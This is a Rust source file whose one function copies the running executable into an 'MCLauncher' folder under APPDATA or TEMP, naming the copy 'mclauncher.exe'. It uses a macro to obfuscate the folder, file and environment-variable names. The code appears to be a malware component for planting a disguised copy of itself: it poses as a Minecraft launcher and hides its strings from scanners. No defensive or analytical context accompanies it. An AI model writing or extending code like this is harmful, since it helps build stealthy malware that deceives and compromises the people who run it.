use std::env;
use std::fs;
use std::path::PathBuf;

use obfuse::obfuse;


pub fn self_copying() -> std::io::Result<()> {
    let current_exe = env::current_exe()?;
    let obfused_appdata = obfuse!("APPDATA");
    let appdata_str = obfused_appdata.as_str();

    let mut dest_path = if let Ok(appdata) = env::var(appdata_str) {
        println!("[INFO] Using AD directory: {}", appdata);
        PathBuf::from(appdata)
    } else {
        println!("[INFO] AD not found, using TEMP directory: {:?}", env::temp_dir());
        env::temp_dir()
    };

    let obfused_dir_name = obfuse!("MCLauncher");
    let dir_name = obfused_dir_name.as_str();

    dest_path.push(dir_name);
    if !dest_path.exists() {
        fs::create_dir_all(&dest_path)?;
        println!("[INFO] Created directory: {:?}", dest_path);
    }

    // let file_name = current_exe.file_name().unwrap_or_else(|| std::ffi::OsStr::new("mclauncher.exe"));
    let obfused_file_name = obfuse!("mclauncher.exe");
    let file_name = obfused_file_name.as_str();

    dest_path.push(file_name);
    fs::copy(&current_exe, &dest_path)?;

    println!("[INFO] Copied to: {:?}", dest_path);

    Ok(())
}